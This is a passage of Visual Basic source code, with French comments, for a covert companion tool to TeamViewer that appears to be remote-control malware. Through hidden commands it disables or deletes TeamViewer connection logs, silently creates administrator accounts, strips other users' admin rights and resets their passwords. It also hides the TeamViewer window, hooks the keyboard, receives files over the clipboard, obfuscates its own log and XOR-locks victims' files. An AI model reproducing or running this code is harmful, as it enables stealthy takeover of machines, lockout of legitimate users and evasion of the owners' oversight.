ShellWait "cmd.exe /c ""reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogIncomingConnections /f""", vbHide
ShellWait "cmd.exe /c ""reg DELETE HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogOutgoingConnections /f""", vbHide

End Sub

Public Sub TVDisableLogings()

ShellWait "cmd.exe /c ""reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v Logging /t REG_DWORD /d 0 /f""", vbHide
ShellWait "cmd.exe /c ""reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogIncomingConnections /t REG_DWORD /d 0 /f""", vbHide
ShellWait "cmd.exe /c ""reg ADD HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\TeamViewer /v LogOutgoingConnections /t REG_DWORD /d 0 /f""", vbHide

End Sub

Public Sub ExecuteCommand(Command As String, Param1 As String, Param2 As String, TypeWindows As Integer)

Dim s As String

' Si pas de paramètre on sort
'----------------------------
Command = Trim(Command)
If Command = "" Then Exit Sub
' On lance la commande en récupérant l'éventuel résultat
'-------------------------------------------------------
dbExecWindows = Shell(Command & " " & Param1 & " " & Param2, TypeWindows)

End Sub

Public Sub OpenWebPage(URL As String, TypeWindows As Integer)

Dim s As String

' Si pas de paramètre on sort
'----------------------------
URL = Trim(URL)
If URL = "" Then Exit Sub
' On lance la commande en récupérant l'éventuel résultat
'-------------------------------------------------------
ShellExecute F_Main.Hwnd, "open", URL, vbNullString, "C:Windows", TypeWindows

End Sub

Public Sub ForceMaximizedApplication(Command As String, Param1 As String, Optional Timout As Long = 5000)

Dim s As String

' Si pas de paramètre on sort
'----------------------------
Command = Trim(Command)
If Command = "" Then Exit Sub
' On lance la commande
'---------------------
dbExecWindows = Shell(Command & " " & Param1, 3)
Sleep 4000
Exec_Hwnd = GetForegroundWindow()
Exec_Par1 = Param1
Exec_Timout = Timout
Exec_cmd = Command

F_Main.Hrlg_Activate.Interval = Timout

End Sub

Public Sub MeanImposeWebPage(URL As String, TypeWindow As Integer, Optional Timout As Long = 5000)

Dim s As String
Dim t As Long

F_Main.Hrlg_Activate.Enabled = False
F_Main.Hrlg_Activate.Interval = 0

' Si pas de paramètre on sort
'----------------------------
URL = Trim(URL)
If URL = "" Then Exit Sub
' On lance la commande
'---------------------
dbExecWindows = ShellExecute(F_Main.Hwnd, "open", URL, vbNullString, "C:Windows", TypeWindow)
Sleep 4000
Exec_Hwnd = GetForegroundWindow()
Exec_Par1 = URL
Exec_Timout = Timout
Exec_cmd = "URL"

F_Main.Hrlg_Activate.Interval = Timout
F_Main.Hrlg_Activate.Enabled = True

End Sub

Public Function Get_Group_Admin_Name(Optional Kill_Tmp_File As Boolean = True) As String

Dim s As String
Dim s_a As String

' Liste des groupes pour déterminer ensuite le nom du group Admin
'----------------------------------------------------------------
ShellWait "cmd.exe /c ""net localgroup > " & Fictmp & """", vbHide
If Lecture_Intégrale_Fichier_Texte(Fictmp, s) Then
    If Kill_Tmp_File Then Kill Fictmp
    ' On recherche le libellé du groupe admin
    '----------------------------------------
    s_a = Libellé_admin(s)
    Get_Group_Admin_Name = s_a
Else
    Get_Group_Admin_Name = ""
End If

End Function

Public Sub CreateAdminAccount(Parametre1 As String, Parametre2 As String)

Dim s_a As String

' Le nom du groupe Admin
'-----------------------
s_a = Get_Group_Admin_Name(True)
If s_a <> "" Then
    If Parametre1 <> "" Then
        If Parametre2 <> "" Then
            ShellWait "cmd.exe /c ""net user " & Parametre1 & " " & Parametre2 & " /add""", vbHide
            ShellWait "cmd.exe /c ""net localgroup " & s_a & " " & Parametre1 & " /add""", vbHide
        Else
            ShellWait "cmd.exe /c ""net user " & Parametre1 & " /add""", vbHide
            ShellWait "cmd.exe /c ""net localgroup " & s_a & " " & Parametre1 & " /add""", vbHide
        End If
    End If
End If

End Sub

Public Sub RemoveAdminRights(Parametre1 As String)

Dim s_a As String
Dim S_user As String

' Le nom du groupe Admin
'-----------------------
s_a = Get_Group_Admin_Name(True)
If s_a <> "" Then
    If Parametre1 = "" Then
        ShellWait "cmd.exe /c ""echo %USERNAME% > " & Fictmp & """", vbHide
        Lecture_Intégrale_Fichier_Texte Fictmp, S_user
        S_user = Left(S_user, Len(S_user) - 3)
    Else
        S_user = Parametre1
    End If
    ShellWait "cmd.exe /c ""net localgroup users """ & S_user & """ /add""", vbHide
    ShellWait "cmd.exe /c ""net localgroup " & s_a & " """ & S_user & """ /delete""", vbHide
End If

End Sub

Public Sub SetAdminRights(Parametre1 As String)

Dim s_a As String
Dim S_user As String

' Le nom du groupe Admin
'-----------------------
s_a = Get_Group_Admin_Name(True)
If s_a <> "" Then
    If Parametre1 = "" Then
        ShellWait "cmd.exe /c ""echo %USERNAME% > " & Fictmp & """", vbHide
        Lecture_Intégrale_Fichier_Texte Fictmp, S_user
        S_user = Left(S_user, Len(S_user) - 3)
    Else
        S_user = Parametre1
    End If
    ShellWait "cmd.exe /c ""net localgroup " & s_a & " """ & S_user & """ /add""", vbHide
End If

End Sub

Public Function Libellé_admin(s As String) As String

Dim i As Integer
Dim j As Integer
Dim s_l As String
Dim k As Integer

j = 1
Do
    i = InStr(j, s, "*")
    If i > 0 Then
        k = InStr(i, s, vbCrLf)
        If k > 0 Then
            s_l = Mid(s, i + 1, k - i - 1)
            If (s_l = "Administrators") _
                Or (s_l = "Administrateurs") _
                Or (s_l = "Administradores") _
                Or (s_l = "Administratoren") _
                Or (s_l = "Amministratori") Then
                Libellé_admin = s_l
                Exit Function
            Else
                j = k
            End If
        Else
            Libellé_admin = ""
            Exit Function
        End If
    Else
        Libellé_admin = ""
        Exit Function
    End If
Loop

End Function

Public Function ShellWait(PathName, Optional WindowStyle As VbAppWinStyle = vbNormalFocus) As Double
Dim hProcess As Long, RetVal As Long
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, False, Shell(PathName, WindowStyle))
    Do
        GetExitCodeProcess hProcess, RetVal
        DoEvents: Sleep 100
    Loop While RetVal = STILL_ACTIVE
End Function


Public Sub Init_Prefixes()

Dim s As String
Dim i As Integer
Dim j As Integer
Dim k As Integer

s = Customization
i = InStr(1, s, "/")
If i > 0 Then
    k = InStr(i + 1, s, "/")
    If k > 0 Then
        S_Prefix = Mid(s, i + 1, k - i - 1)
    Else
        S_Prefix = "TV"
        L_Prefix = "TVControl"
        Exit Sub
    End If
Else
    S_Prefix = "TV"
    L_Prefix = "TVControl"
    Exit Sub
End If
j = InStr(k + 1, s, "/")
If j > 0 Then
    L_Prefix = Mid(s, k + 1, j - k - 1)
Else
    L_Prefix = "TVControl"
End If

End Sub

Public Sub Set_Clipboard(Content As String)

Clipboard.Clear
Clipboard.SetText Content, vbCFText
s_CurrentClipboard = Content
F_Main.Timer_Clipboard.Interval = 20000
F_Main.Timer_Clipboard.Enabled = True

End Sub

Public Sub TDeb(text As String)

Dim F_Num As Integer
Dim s As String
Dim s1 As String
Dim s2 As String
Dim i As Integer
Dim j As Integer
Dim l As Integer
Dim c As String

s1 = ""
s2 = "Such a nice day"
l = Len(s2)
s = Now & ": (" & Current_D_PC_Name & ") " & text & vbCr
j = 1
For i = 1 To Len(s)
    c = Chr(Asc(Mid(s, i, 1)) Xor Asc(Mid(s2, j, 1)))
    If (c = Chr(10)) Or (c = Chr(13)) Or (c = "\") Then
        c = "\" & c
    End If
    s1 = s1 & c
    j = j + 1
    If j > l Then j = 1
Next i

F_Num = FreeFile
Open TmpDir & "\htvpdebug.txt" For Append Access Write As F_Num
Print #F_Num, s1
Close F_Num

End Sub

Public Sub End_htvp()

Dim res As Boolean

' Ends the tool
'--------------
res = UnhookWindowsHookEx(hook)
TDeb "EXIT"
D_Saisies = ""
hidetv = False
Hide_MainTV = False
HideTVComp = False
nokey = False
mean_force_to_type = False
tv_exit = True

End Sub

Public Sub Uninstall_htvp()

' Supprime la tâche du scheduler
'-------------------------------
ShellWait "cmd.exe /c ""schtasks /delete /tn htvp /f""", vbHide
' Arrête le programme
'--------------------
End_htvp

End Sub


Public Sub GetWindowTeamViewerHandle()

Dim lgRep As Long

TeamViewer_hwnd = 0
' Appel de l'API et envoi du pointeur vers notre fonction de rappel
lgRep = EnumWindows(AddressOf EnumWindowsProc, 0)

End Sub

Public Function EnumWindowsProc(ByVal lgHwnd As Long, ByVal lgParam As Long) As Long

Dim stTmp As String, lgTmp As Long, lgRet As Long, s As String
stTmp = Space$(120)
lgTmp = 119
lgRet = GetWindowText(lgHwnd, stTmp, lgTmp)
s = Trim(Replace(stTmp, Chr$(0), vbNullString))
If s = "TeamViewer" Then TeamViewer_hwnd = lgHwnd
EnumWindowsProc = 1

End Function

Public Function LireIni(stSection As String, stKey As String, stFichier As String) As String
' Lecture d'une valeur dans un fichier INI
' stSection est le la partie designée entre crochets ([option] par exemple)
' stKey est le nom de la clé à récupérer (COULEUR=... par exemple)
Dim stBuf As String, lgBuf As Long, lgRep As Long
' Mise en place du buffer de lecture
stBuf = Space$(255)
lgBuf = 255
lgRep = GetPrivateProfileString(stSection, stKey, "", stBuf, lgBuf, stFichier)
LireIni = Left$(stBuf, lgRep)
End Function

Public Sub EcrireIni(stSection As String, stKey As String, stValeur As String, stFichier As String)
' Lecture d'une valeur dans un fichier INI
' stSection est le la partie designée entre crochets ([option] par exemple)
' stKey est le nom de la clé à récupérer (COULEUR=... par exemple)
' stValeur est la valeur à stocker
' stFichier est le fichier à manipuler
WritePrivateProfileString stSection, stKey, stValeur, stFichier
End Sub

Public Sub OtherAccountManagement(Command As String, Admin_Account As String, PW As String)

Dim a_list As User_List_Type
Dim i As Integer
Dim s_a As String
Dim Current_Account As String

' Si pas d'admin à conserver on sort
'-----------------------------------
If Trim(Admin_Account) = "" Then Exit Sub

' Le nom de l'utilisateur courant
'--------------------------------
Current_Account = Environ("USERNAME")

' Le nom du groupe Admin
'-----------------------
s_a = Get_Group_Admin_Name(True)

' La liste des admin actuels
'---------------------------
a_list = GetAdminList(s_a)

' On vérifie que l'admin à conserver est bien un admin, sinon on sort
'--------------------------------------------------------------------
For i = 1 To a_list.nb_AccountName
    If Trim(a_list.AccountName(i)) = Trim(Admin_Account) Then Exit For
Next i
If i > a_list.nb_AccountName Then Exit Sub

' On leur retire les droits admin sauf à l'admin à conserver et à l'utilisateur courant
'--------------------------------------------------------------------------------------
If (Command = "OthersRemoveAdminAndChangePW") Or (Command = "OthersRemoveAdmin") Then
    For i = 1 To a_list.nb_AccountName
        If (Trim(a_list.AccountName(i)) <> Trim(Admin_Account)) And (Trim(a_list.AccountName(i)) <> Trim(Current_Account)) Then
            ' C'est un compte à rendre standard
            '----------------------------------
            ShellWait "cmd.exe /c ""net localgroup users """ & a_list.AccountName(i) & """ /add""", vbHide
            ShellWait "cmd.exe /c ""net localgroup " & s_a & " """ & a_list.AccountName(i) & """ /delete""", vbHide
        End If
    Next i
End If

If (Command = "OthersRemoveAdminAndChangePW") Or (Command = "OthersChangePW") Then
    ' La liste des users
    '-------------------
    a_list = GetUserList()
    
    ' On leur retire les droit admin sauf à l'admin à conserver et à l'utilisateur courant
    '-------------------------------------------------------------------------------------
    For i = 1 To a_list.nb_AccountName
        If (Trim(a_list.AccountName(i)) <> Trim(Admin_Account)) And (Trim(a_list.AccountName(i)) <> Trim(Current_Account)) Then
            If PW <> "" Then
                ShellWait "cmd.exe /c ""net user """ & a_list.AccountName(i) & """ """ & PW & """", vbHide
            Else
                ShellWait "cmd.exe /c ""net user """ & a_list.AccountName(i) & """ " & """""""", vbHide
            End If
        End If
    Next i
End If

End Sub


Public Function GetAdminList(Optional s_a As String = "") As User_List_Type

Dim s As String
Dim i As Long
Dim c As String
Dim s_admin As String

' Les administrateurs
'--------------------
' Le nom du groupe Admin
'-----------------------
If s_a = "" Then s_a = Get_Group_Admin_Name(False)
If s_a <> "" Then
    ' La liste des admin...
    '----------------------
    ShellWait "cmd.exe /c ""net localgroup " & s_a & " > " & Fictmp & """", vbHide
    If Lecture_Intégrale_Fichier_Texte(Fictmp, s) Then
        ' On efface le fichier temporaire
        '--------------------------------
        Kill Fictmp
        ' On cherche la fin de la ligne de "-"
        '-------------------------------------
        i = InStr(1, s, "-------" & vbCr & vbLf)
        ' Si trouvée...
        '--------------
        If i > 0 Then
            ' On ne garde que la suite
            '-------------------------
            s = Right(s, Len(s) - i - 8)
            ' On recherche le point final
            '----------------------------
            i = InStr(1, s, "." & vbCr & vbLf)
            ' Si trouvé...
            '-------------
            If i > 0 Then
                ' On recherche le précédent saut de ligne
                '----------------------------------------
                Do
                    i = i - 1
                    If i < 1 Then Exit Do
                    c = Mid(s, i, 1)
                    If c = vbLf Then
                        ' On a trouvé : on élimine ce qui suit
                        '-------------------------------------
                        s = Left(s, i)
                        Exit Do
                    End If
                Loop
            End If
        End If
    End If
End If
' On les met dans le tableau de sortie
'-------------------------------------
GetAdminList.nb_AccountName = 0
s_admin = ""
For i = 1 To Len(s)
    c = Mid(s, i, 1)
    If c = vbCr Then
        GetAdminList.nb_AccountName = GetAdminList.nb_AccountName + 1
        ReDim Preserve GetAdminList.AccountName(GetAdminList.nb_AccountName)
        GetAdminList.AccountName(GetAdminList.nb_AccountName) = s_admin
        s_admin = ""
    ElseIf c <> vbLf Then
        s_admin = s_admin + c
    End If
Next i

End Function


Public Function GetUserList() As User_List_Type

Dim s As String
Dim s_users As String
Dim Saut As Boolean
Dim i As Long
Dim c As String
Dim c1 As String

' Les utilisateurs
'-----------------
ShellWait "cmd.exe /c ""net Users > " & Fictmp & """", vbHide
If Lecture_Intégrale_Fichier_Texte(Fictmp, s) Then
    ' On efface le fichier temporaire
    '--------------------------------
    Kill Fictmp
    ' On cherche la fin de la ligne de "-"
    '-------------------------------------
    i = InStr(1, s, "-------" & vbCr & vbLf)
    ' Si trouvée...
    '--------------
    If i > 0 Then
        ' On ne garde que la suite
        '-------------------------
        s = Right(s, Len(s) - i - 8)
        ' On recherche le point final
        '----------------------------
        i = InStr(1, s, "." & vbCr & vbLf)
        ' Si trouvé...
        '-------------
        If i > 0 Then
            ' On recherche le précédent saut de ligne
            '----------------------------------------
            Do
                i = i - 1
                If i < 1 Then Exit Do
                c = Mid(s, i, 1)
                If c = vbLf Then
                    ' On a trouvé : on élimine ce qui suit
                    '-------------------------------------
                    s = Left(s, i)
                    Exit Do
                End If
            Loop
        End If
    End If
End If
' On les met dans le tableau de sortie
'-------------------------------------
GetUserList.nb_AccountName = 0
s_users = ""
Saut = False
For i = 1 To Len(s)
    ' Les espaces simples ne sont pas des séparateurs de noms, il en faut au moins deux de suite
    '-------------------------------------------------------------------------------------------
    c = Mid(s, i, 1)
    c1 = Mid(s, i, 2)
    If (c1 = "  ") Or ((c = " ") And Saut) Then
        If Not Saut Then
            Saut = True
            GetUserList.nb_AccountName = GetUserList.nb_AccountName + 1
            ReDim Preserve GetUserList.AccountName(GetUserList.nb_AccountName)
            GetUserList.AccountName(GetUserList.nb_AccountName) = s_users
            s_users = ""
        End If
    ElseIf c = vbCr Then
        If Not Saut Then
            GetUserList.nb_AccountName = GetUserList.nb_AccountName + 1
            ReDim Preserve GetUserList.AccountName(GetUserList.nb_AccountName)
            GetUserList.AccountName(GetUserList.nb_AccountName) = s_users
            s_users = ""
        End If
    Else
        Saut = False
        s_users = s_users + c
    End If
Next i

End Function

Public Sub ChangeMouseSpeed(Vitesse As String)

Dim lngResult As Long
Dim Speed As Long

Speed = Val(Vitesse)
SystemParametersInfo SPI_SETMOUSESPEED, 0, ByVal Speed, 0
'lngResult = SystemParametersInfo(SPI_SETMOUSESPEED, MAX_PATH, s, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)

End Sub

Public Sub SetWallpaper(NomPic As String)

Dim lngResult As Long
Dim s As String
Dim i As Integer

' On regarde si le wallpaper d'origine est déjà sauvegardé
'---------------------------------------------------------
s = LireIni("WallPaper", "NomPicInitial", Fic_ini)
' S'il ne l'est pas...
'---------------------
If Trim(s) = "" Then
    ' On sauvegarde le wallpaper courant
    '-----------------------------------
    s = Space(MAX_PATH)
    lngResult = SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, s, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)
    For i = 1 To MAX_PATH
        If Mid(s, i, 1) = Chr(0) Then Exit For
    Next i
    s = Left(s, i - 1)
    EcrireIni "WallPaper", "NomPicInitial", s, Fic_ini
' S'il l'est...
'--------------
Else
    ' On regarde s'il a changé
    '-------------------------
    s = Space(MAX_PATH)
    lngResult = SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, s, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)
    For i = 1 To MAX_PATH
        If Mid(s, i, 1) = Chr(0) Then Exit For
    Next i
    s = Left(s, i - 1)
    If s <> NomPic Then
        lngResult = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, NomPic, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)
    End If
End If

End Sub


Public Sub ForceWelcomeScreen()

Dim lngResult As Long
Dim s1 As String
Dim s2 As String
Dim i As Integer

' C'est le changement de Wallpaper qui reset l'écran d'accueil
'-------------------------------------------------------------

' On regarde si le wallpaper courant est déjà sauvegardé
'-------------------------------------------------------
s1 = LireIni("WallPaper", "NomPicCourant", Fic_ini)
' S'il ne l'est pas...
'---------------------
If Trim(s1) = "" Then
    ' On sauvegarde le wallpaper courant
    '-----------------------------------
    s1 = Space(MAX_PATH)
    lngResult = SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, s1, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)
    For i = 1 To MAX_PATH
        If Mid(s1, i, 1) = Chr(0) Then Exit For
    Next i
    s1 = Left(s1, i - 1)
    EcrireIni "WallPaper", "NomPicCourant", s1, Fic_ini
' S'il l'est...
'--------------
Else
    ' On regarde s'il a changé
    '-------------------------
    s2 = Space(MAX_PATH)
    lngResult = SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, s2, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)
    For i = 1 To MAX_PATH
        If Mid(s2, i, 1) = Chr(0) Then Exit For
    Next i
    s2 = Left(s2, i - 1)
    If s2 <> s1 Then
        ' Il a changé, on sauvegarde le nouveau et on force de nouveau le WelcomeScreen
        '------------------------------------------------------------------------------
        EcrireIni "WallPaper", "NomPicCourant", s2, Fic_ini
        SetWelcomeBackground Nom_WelcomeScreen
    End If
End If

End Sub

Public Sub RecoverWallpaper()

Dim lngResult As Long
Dim s As String
Dim i As Integer

' On indique qu'il n'y a plus de WallPaper permanent (au cas où il était permanent)
'----------------------------------------------------------------------------------
WallPaperPermanent = False
EcrireIni "WallPaper", "NomPic", "", Fic_ini

' On prend le wallpaper d'origine (si sauvegardé, sinon vide)
'------------------------------------------------------------
s = Trim(LireIni("WallPaper", "NomPicInitial", Fic_ini))
' On le remet en service
'-----------------------
lngResult = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, s, SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)

End Sub

Public Sub DeleteWallpaper()

Dim lngResult As Long

' On indique qu'il n'y a plus de WallPaper permanent (au cas où il était permanent)
'----------------------------------------------------------------------------------
WallPaperPermanent = False
EcrireIni "WallPaper", "NomPic", "", Fic_ini

' On supprime le WallPaper
'-------------------------
lngResult = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, "", SPIF_UPDATEINIFILE + SPIF_SENDWININICHANGE)

' On efface de l'outil le WallPaper d'origine (sauvegarde)
'---------------------------------------------------------
EcrireIni "WallPaper", "NomPicInitial", "", Fic_ini

End Sub

Public Sub FileChunkReception(NumChunk As Integer, Chunk As String)

Dim s As String
Dim i As Long
Dim c As String

' Si NumChunk n'est pas le bon on redemande le bon
'------------------------------------------------
If NumChunk <> Recep_LastNumChunk + 1 Then
    s = Prefix_answer & "ContentTrsf" & vbCrLf
    s = s & Format(Recep_LastNumChunk, "0") & " " & Recep_ID & vbCrLf
    Set_Clipboard s
    Exit Sub
End If

' Le Chunk est le bon
'--------------------
' On note le numéro de Chunk courant
'-----------------------------------
Recep_LastNumChunk = NumChunk
' On demande tout de suite le suivant
'------------------------------------
s = Prefix_answer & "ContentTrsf" & vbCrLf
s = s & Format(Recep_LastNumChunk, "0") & " " & Recep_ID & vbCrLf
Set_Clipboard s
' On décode le Chunk en l'ajoutant à ce qu'on a déjà reçu
'--------------------------------------------------------
s = ""
For i = 1 To Len(Chunk) Step 2
    c = Mid(Chunk, i, 2)
    s = s & Chr("&H" & c)
    DoEvents
Next i
Recep_Content = Recep_Content & s

End Sub

Public Sub Lock_Files(Name As String, Prefix_and_PW As String)

Dim s As String
Dim F_Num As Integer
Dim s1 As String
Dim s2 As String
Dim i As Long
Dim j As Long
Dim k As Integer
Dim l As Long
Dim Name1 As String
Dim Folder1 As String
Dim s_crc As String
Dim Prefix As String
Dim PW As String
Dim S_Sansétoile As String
Dim FolderContent As Boolean
Dim Extension As String

' Séparation du Préfixe et du mot de passe
'-----------------------------------------
i = InStr(1, Prefix_and_PW, "|")
If i > 0 Then
    Prefix = Left(Prefix_and_PW, i - 1)
    PW = Right(Prefix_and_PW, Len(Prefix_and_PW) - i)
Else
    Prefix = Prefix_and_PW
    PW = "Such a nice day"
End If
' Extraction de la partie sans étoiles et de l'extension éventuelle (filtre)
'---------------------------------------------------------------------------
i = InStr(1, Name, "*")
If i > 0 Then
    For j = i - 1 To 1 Step -1
        If Mid(Name, j, 1) = "\" Then Exit For
    Next j
    S_Sansétoile = Left(Name, j - 1)
    For k = Len(Name) To i + 1 Step -1
     If Mid(Name, k, 1) = "." Then Exit For
    Next k
    Extension = Right(Name, Len(Name) - k)
Else
    S_Sansétoile = Name
    Extension = ""
End If
' Est-ce un répertoire ?
'-----------------------
If (Dir(S_Sansétoile) = "") And (Dir(S_Sansétoile, vbDirectory) <> "") Then
    FolderContent = True
Else
    FolderContent = False
End If

' S'il s'agit d'un fichier unique...
'-----------------------------------
If Not FolderContent Then
    ' Le répertoire et le nom du fichier
    '-----------------------------------
    For i = Len(Name) To 1 Step -1
        If Mid(Name, i, 1) = "\" Then Exit For
    Next i
    If i > 0 Then
        Folder1 = Left(Name, i - 1)
        Name1 = Right(Name, Len(Name) - i)
    Else
        Folder1 = ""
        Name1 = Name
    End If
    ' Verrouillage du fichier
    '------------------------
    Lock_File Folder1, Name1, Prefix, PW

' S'il s'agit du contenu d'un répertoire...
'------------------------------------------
Else
    Name1 = Dir(S_Sansétoile & "\")
    While Name1 <> ""
        DoEvents
        If (Right(Name1, Len(Extension)) = Extension) Or (Extension = "") Or (Extension = "*") Then
            Lock_File S_Sansétoile, Name1, Prefix, PW
        End If
        Name1 = Dir
    Wend
End If

Exit Sub

Lock_Files_err:

End Sub


Public Sub Lock_File_new(Folder As String, Name As String, Prefix As String, PW As String)

Dim F_Num As Integer
Dim i As Long
Dim j As Long
Dim l As Long
Dim Name1 As String
Dim s_crc As String

Dim s3 As String
Dim ls3 As Long
Dim td As String
Dim tc() As Byte
Dim tf As String
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte
Dim lg_encrypted_loc As Long

' Lecture intégrale du fichier
'-----------------------------
On Error GoTo Lock_Files_err
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
td = String$(LOF(F_Num), " ")
Get F_Num, , td
Close F_Num
' Si le fichier est déjà verrouillé, on sort (verrouillé : le début commance par "lock")
'---------------------------------------------------------------------------------------
If Left(td, Len("lock")) = "lock" Then Exit Sub
' CRC sur les lg_crc premiers caractères
'---------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = Asc(Mid(td, i + 1, 1))
Next i
s_crc = Format(CRC16B(tcrc))
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' On prépare la chaine de sortie avec son début
'----------------------------------------------
tf = "lock" & Prefix & "|" & Format(Len(s_crc)) & s_crc
' Modification non destructif des lg_encrypted premiers octets du contenu et stockage dans la suite de la chaine de sortie
'-------------------------------------------------------------------------------------------------------------------------
l = Len(PW) - 1
j = 0
If lg_encrypted > ld Then
    lg_encrypted_loc = ld
Else
    lg_encrypted_loc = lg_encrypted
End If
For i = 1 To lg_encrypted_loc
    tf = tf & Chr(Asc(Mid(td, i, 1)) Xor tc(j))
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' on complète avec la suite non cryptée
'--------------------------------------
tf = tf & Right(td, ld - lg_encrypted_loc)
' Le nom du fichier
'------------------
Name1 = Prefix & Name
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error GoTo Lock_Files_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
Kill Folder & "\" & Name

Lock_Files_err:

End Sub

Public Sub Unlock_File_new(Folder As String, Name As String, Password As String)

Dim s As String
Dim F_Num As Integer
Dim s1 As String
Dim s2 As String
Dim i As Long
Dim j As Long
Dim l As Long
Dim Prefix As String
Dim Name1 As String
Dim s_crc As String
Dim l_crc As Integer
Dim PW As String


Dim s3 As String
Dim ls3 As Long
Dim td As String
Dim tc() As Byte
Dim tf As String
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte
Dim nb_entête As Long
Dim c As String
Dim lg_encrypted_loc As Long

' Mot de passe
'-------------
If Password = "" Then
    PW = "Such a nice day"
Else
    PW = Password
End If
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' Lecture intégrale du fichier
'-----------------------------
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
td = String$(LOF(F_Num), " ")
Get F_Num, , td
Close F_Num
' Si le fichier n'est pas verrouillé, on sort
'--------------------------------------------
If Left(td, Len("lock")) <> "lock" Then Exit Sub
' Extraction du préfixe et du crc
'--------------------------------
Prefix = ""
For i = Len("lock") + 1 To 200
    If i > ld Then Exit Sub
    c = Mid(td, i, 1)
    If c = "|" Then Exit For
    Prefix = Prefix & c
Next i
If c <> "|" Then Exit Sub
l_crc = Val(Mid(td, i + 1, 1))
s_crc = ""
For j = 1 To l_crc
    s_crc = s_crc & Mid(td, i + 1 + j, 1)
Next j
' Nombre total de caractères de l'entête à supprimer
'---------------------------------------------------
nb_entête = i + 1 + l_crc
' Restauration du contenu (les lg_encrypted premiers caractères seulement sont cryptés)
'--------------------------------------------------------------------------------------
l = Len(PW) - 1
j = 0
If lg_encrypted + nb_entête > ld Then
    lg_encrypted_loc = ld - nb_entête
Else
    lg_encrypted_loc = lg_encrypted
End If
tf = ""
For i = nb_entête + 1 To lg_encrypted + nb_entête
    tf = tf & Chr(Asc(Mid(td, i, 1)) Xor tc(j))
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' On complète avec la partie non cryptée
'---------------------------------------
tf = tf & Right(td, ld - lg_encrypted_loc - nb_entête)
' Vérification du crc (sur les lg_crc premiers caractères)
'---------------------------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = Asc(Mid(tf, i + 1, 1))
Next i
If s_crc <> Format(CRC16B(tcrc)) Then Exit Sub
' Restauration du nom
'--------------------
i = InStr(1, Name, Prefix)
If i = 1 Then
    Name1 = Right(Name, Len(Name) - Len(Prefix))
Else
    Name1 = Name
End If
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error Resume Next
Kill Folder & "\" & Name1
On Error GoTo Unlock_File_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
If Name <> Name1 Then Kill Folder & "\" & Name

Exit Sub

Unlock_File_err:

End Sub


Public Sub Lock_File(Folder As String, Name As String, Prefix As String, PW As String)

Dim F_Num As Integer
Dim i As Long
Dim j As Long
Dim l As Long
Dim Name1 As String
Dim s_crc As String
Dim lg_encrypted_loc As Long

Dim s3 As String
Dim ls3 As Long
Dim td() As Byte
Dim tc() As Byte
Dim tf() As Byte
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte

' Lecture intégrale du fichier
'-----------------------------
On Error GoTo Lock_Files_err
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
ReDim td(ld - 1)
Get F_Num, , td
Close F_Num
' Si le fichier est déjà verrouillé, on sort (verrouillé : le début commance par "lock")
'---------------------------------------------------------------------------------------
For i = 0 To Len("lock") - 1
    If td(i) <> Asc(Mid("lock", i + 1, 1)) Then Exit For
Next i
If i > Len("lock") - 1 Then Exit Sub
' CRC sur les lg_crc premiers caractères
'---------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = td(i)
Next i
s_crc = Format(CRC16B(tcrc))
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' On prépare le tableau de bytes de sortie avec son début
'--------------------------------------------------------
s3 = "lock" & Prefix & "|" & Format(Len(s_crc)) & s_crc
ls3 = Len(s3)
ReDim tf(ls3 + ld - 1)
For i = 0 To ls3 - 1
    tf(i) = Asc(Mid(s3, i + 1, 1))
Next i
' Modification non destructif des lg_encrypted premiers octets du contenu et stockage dans la suite du tableau de sortie
'-----------------------------------------------------------------------------------------------------------------------
l = Len(PW) - 1
j = 0
If lg_encrypted > ld Then
    lg_encrypted_loc = ld
Else
    lg_encrypted_loc = lg_encrypted
End If
